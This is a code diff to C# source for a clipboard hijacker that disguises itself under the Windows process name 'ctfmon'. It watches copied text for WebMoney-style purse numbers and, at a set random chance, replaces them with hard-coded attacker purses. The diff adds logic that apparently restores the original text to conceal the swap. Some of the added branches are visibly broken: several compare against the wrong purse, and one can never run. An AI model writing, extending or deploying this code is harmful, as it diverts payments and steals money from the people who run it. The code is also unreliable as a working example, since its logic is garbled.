@@ -39,6 +39,7 @@ namespace ctfmon
         public Random rand = new Random();
         public bool isOff = true;
         public int Refconnect = 1000;
+        string pDataPurse = "";
 
         [DllImport("user32.dll")]
         public static extern IntPtr FindWindow(String sClassName, String sAppName);
@@ -149,60 +150,106 @@ namespace ctfmon
                 string data = Clipboard.GetText();
                 if (Regex.IsMatch(data, "R[0-9]+", RegexOptions.IgnoreCase) && data != RPurse && Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) < configChance)
+                    if (data == RPurse)
                     {
-                        if (Regex.IsMatch(data, "r") == true)
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse.ToLower()));
+                            data = pDataPurse;
+                            Clipboard.SetText(data);
                         }
-                        else
+                    }
+                    else
+                    {
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse));
+                            if (Regex.IsMatch(data, "r") == true)
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse.ToLower()));
+                                pDataPurse = data;
+                            }
+                            else
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value, RPurse));
+                                pDataPurse = data;
+                            }
                         }
                     }
                 }
 
                 if (Regex.IsMatch(data, "U[0-9]+", RegexOptions.IgnoreCase) && data != UPurse && Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) < configChance)
+                    if (data == RPurse)
                     {
-                        if (Regex.IsMatch(data, "u") == true)
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse.ToLower()));
+                            data = pDataPurse;
+                            Clipboard.SetText(data);
                         }
-                        else
+                    }
+                    else
+                    {
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse));
+                            if (Regex.IsMatch(data, "u") == true)
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse.ToLower()));
+                            }
+                            else
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "U[0-9]+", RegexOptions.IgnoreCase).Value, UPurse));
+                            }
                         }
                     }
                 }
 
                 if (Regex.IsMatch(data, "Z[0-9]+", RegexOptions.IgnoreCase) && data != ZPurse && Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) < configChance)
+                    if (data == RPurse)
                     {
-                        if (Regex.IsMatch(data, "z") == true)
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse.ToLower()));
+                            data = pDataPurse;
+                            Clipboard.SetText(data);
                         }
-                        else
+                    }
+                    else
+                    {
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse));
+                            if (Regex.IsMatch(data, "z") == true)
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse.ToLower()));
+                            }
+                            else
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "Z[0-9]+", RegexOptions.IgnoreCase).Value, ZPurse));
+                            }
                         }
                     }
                 }
 
                 if (Regex.IsMatch(data, "E[0-9]+", RegexOptions.IgnoreCase) && data != EPurse && Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (rand.Next(0, 100) < configChance)
+                    if (data == RPurse)
                     {
-                        if (Regex.IsMatch(data, "e") == true)
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse.ToLower()));
+                            data = pDataPurse;
+                            Clipboard.SetText(data);
                         }
-                        else
+                    }
+                    else
+                    {
+                        if (rand.Next(0, 100) < configChance)
                         {
-                            Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse));
+                            if (Regex.IsMatch(data, "e") == true)
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse.ToLower()));
+                            }
+                            else
+                            {
+                                Clipboard.SetText(data.Replace(Regex.Match(data, "E[0-9]+", RegexOptions.IgnoreCase).Value, EPurse));
+                            }
                         }
                     }
                 }
